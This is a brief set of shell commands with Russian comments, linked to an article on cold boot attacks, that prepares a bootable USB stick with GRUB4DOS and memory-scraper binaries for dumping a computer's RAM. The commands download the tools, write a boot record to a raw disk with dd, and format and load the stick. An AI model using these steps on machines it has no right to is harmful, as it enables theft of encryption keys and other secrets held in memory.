# Cold Boot Attack [ориг](https://hackmag.com/security/cold-boot-attack/)



wget https://github.com/baselsayeh/coldboot-tools/releases/download/2/bios_memimage64.zip # скачиваем наш скрипт


sudo dd if=grldr.mbr of=/dev/sdb conv=notrunc   # устанавливаем GRUB4DOS на диск


sudo fdisk /dev/sdb     # создаем 1 раздел (заполнять не до конца 4-8 гб оставить)


sudo mkfs.fat /dev/sdb1 # используем простую файловую систему


sudo mount /dev/sdb1 /media/usb 


cp grldr menu_sec_part.lst scraper*.bin /media/usb/ # грузим утилиты


